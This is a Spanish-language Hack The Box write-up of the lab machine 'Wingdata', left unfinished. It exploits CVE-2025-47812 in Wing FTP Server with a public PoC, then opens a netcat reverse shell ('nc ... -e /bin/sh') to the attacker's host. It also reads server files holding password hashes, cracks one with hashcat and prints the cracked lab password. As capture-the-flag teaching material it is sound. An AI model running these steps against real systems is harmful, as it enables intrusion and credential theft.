# Wingdata — HTB (Writeup)

> **Autor:** Ángel de la Vega Cuevas
> **Objetivo:** Documentar el proceso de enumeración y explotación inicial en la máquina *Wingdata* de Hack The Box.

---

## Resumen

Durante la enumeración se identificó un servicio web asociado a **Wing FTP Server**. El servidor resultó vulnerable a **CVE-2025-47812**, una vulnerabilidad que permite ejecución remota de comandos sin autenticación mediante inyección de código Lua en archivos de sesión. La explotación permitió ejecutar comandos como el usuario `wingftp` y acceder al sistema.

> ⚠️ Writeup en progreso — máquina no completada aún.

---

## 1) Descubrimiento

* **IP objetivo (lab):** `10.129.4.4` / `ftp.wingdata.htb`
* **OS detectado:** Linux
* **Servicios detectados:** HTTP (Wing FTP Server webadmin)

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.4.4 -oG allPorts
```

> El dominio `ftp.wingdata.htb` requiere resolución manual. Añadir al `/etc/hosts`:
> ```
> 10.129.4.4   ftp.wingdata.htb wingdata.htb
> ```

---

## 2) Enumeración

Durante la enumeración web se identificó que el servidor ejecuta **Wing FTP Server**.

Investigando vulnerabilidades públicas se encontró **CVE-2025-47812**, que afecta a Wing FTP Server <= 7.4.3 y permite:

- Ejecución remota de comandos sin autenticación
- Inyección de código Lua en el parámetro `username` (NULL byte injection)
- Ejecución automática del payload al acceder a `/dir.html`

---

## 3) Explotación (CVE-2025-47812)

Se utilizó el siguiente PoC público:

```
https://github.com/AzureADTrent/CVE-2025-4517-POC-HTB-WingData
```

Preparación del entorno:

```bash
python3 -m venv venv
source venv/bin/activate
pip install requests prompt_toolkit
```

Ejecución del exploit:

```bash
python3 exploit.py -u http://ftp.wingdata.htb
```

Salida obtenida:

```
[*] Targeting http://ftp.wingdata.htb
[*] Logging in with injected payload...
[*] Triggering payload...
[+] Target is vulnerable! Command output:
uid=1000(wingftp) gid=1000(wingftp) groups=1000(wingftp),...
[+] Shell opened. Type 'exit' or Ctrl+C to quit.

Shell>
```

RCE confirmado como usuario `wingftp`.

---

## 4) Enumeración del sistema

Desde la `Shell>` del exploit:

```bash
id
# uid=1000(wingftp)

ls /opt/wingftp
# Data  License.txt  Log  lua  session  session_admin  webadmin  webclient  wftpserver

cat /etc/passwd
# usuarios relevantes: wingftp, wacky, root
```

---

## 5) Reverse shell

La shell del exploit expira rápidamente (`session expired`), por lo que se intentó obtener una shell estable.

Listener en Kali:

```bash
nc -lvnp 4444
```

Payload ejecutado desde `Shell>`:

```bash
nc 10.10.16.140 4444 -e /bin/sh
```
<img width="687" height="207" alt="image" src="https://github.com/user-attachments/assets/c5685605-52c8-4e32-8c58-3b388d5c56e4" />

Conexión recibida:

```
connect to [10.10.15.55] from (UNKNOWN) [10.129.4.4] 49738
```
<img width="560" height="439" alt="image" src="https://github.com/user-attachments/assets/cd1f4e13-482e-41c4-b101-ee8151c0ae15" />

Para mejorar la Shell
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```
---
# 6) Búsqueda de credenciales

Wing FTP Server almacena la configuración en `/opt/wftpserver/Data/`. Se exploró la estructura:

```bash
ls /opt/wftpserver/Data/
# 1  _ADMINISTRATOR  bookmark_db  settings.xml  ssh_host_ecdsa_key  ssh_host_key
```

### Hash del administrador del panel web

```bash
cat /opt/wftpserver/Data/_ADMINISTRATOR/admins.xml
```

```xml
admin
a8339f8e4465a9c47158394d8efe7cc45a5f361ab983844c8562bef2193bafba
```

El panel admin corre en el **puerto 5466** (detectado en `settings.xml`), pero no es accesible externamente.

### Usuarios FTP del servidor

```bash
ls /opt/wftpserver/Data/1/users/
# anonymous.xml  john.xml  maria.xml  steve.xml  wacky.xml

cat /opt/wftpserver/Data/1/users/wacky.xml
```

```xml
wacky
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca
```

---

## 7) Crackeo del hash (wacky)

El hash está en formato `sha256($pass.$salt)` donde el salt es la cadena fija **`WingFTP`**.

```bash
echo "32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP" > hash.txt
hashcat -m 1410 hash.txt rockyou.txt
```

Resultado:

```
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5
Status: Cracked
```

| Usuario | Contraseña |
|---------|-----------|
| `wacky` | `!#7Blushing^*Bride5` |

> **Nota:** El salt correcto es `WingFTP` (con mayúsculas exactas), no el nombre de usuario. Intentar con el username como salt agota rockyou sin resultado.

---



## 6) Notas técnicas

- La shell del exploit es temporal — cada comando abre y cierra una sesión HTTP, lo que provoca `session expired` frecuentes.
- El payload `bash -i >& /dev/tcp/...` falla porque zsh no soporta `/dev/tcp`. Usar `nc` o `python3` como alternativa.
- `admins.xml` en Wing FTP Server suele contener hashes del administrador web, que pueden usarse para acceder al panel y ejecutar scripts Lua con más privilegios.
